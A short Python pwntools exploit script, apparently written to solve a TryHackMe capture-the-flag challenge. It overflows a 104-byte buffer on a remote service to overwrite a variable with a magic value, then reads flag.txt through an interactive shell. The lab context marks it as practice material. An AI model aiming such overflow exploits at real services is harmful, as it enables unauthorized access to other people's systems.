from pwn import *
import struct

target_address = input(str("Enter your IP: ")) # your TryHackMe machine IP
target_port = 9002

conn = remote(target_address, target_port)

initial_data = conn.recvuntil(b'Am I right? ')
print(initial_data)

# payload creation
buffer_size = 104  # calculated offset
v5_value = struct.pack('<Q', 0xC0FF330000C0D3)  # New value for v5 (<Q means little-endian)

payload = b'A' * buffer_size  
payload += v5_value  # new value

# send payload
conn.sendline(payload)
#read flag
conn.sendline('cat flag.txt')

# shell interaction and conn close
conn.interactive()
conn.recv()
conn.close()
